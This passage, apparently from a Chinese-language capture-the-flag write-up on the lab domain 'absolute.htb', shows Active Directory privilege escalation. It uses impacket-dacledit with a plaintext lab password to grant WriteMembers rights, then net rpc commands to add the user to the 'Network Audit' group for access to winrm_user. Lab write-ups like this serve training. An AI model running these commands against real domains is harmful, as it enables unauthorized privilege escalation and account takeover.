我们先要将自己添加到networkaudit组内，这样才能针对winrm_user进行访问

![image-20250108205734240](https://s2.loli.net/2025/01/08/YFRl5wxsPWpE2UD.png)

```
#获取相应的权限凭证
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'm.lovegod' -target 'Network Audit' 'absolute.htb'/'m.lovegod':'AbsoluteLDAP2022!' -k -dc-ip dc.absolute.htb
```

![image-20250108210217091](https://s2.loli.net/2025/01/08/hLOQiGf8uURbqaX.png)

```
#添加权限
net rpc group addmem "Network Audit" "m.lovegod" -U absolute.htb/m.lovegod -S dc.absolute.htb
net rpc group addmem "Network Audit" "m.lovegod" -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb
```
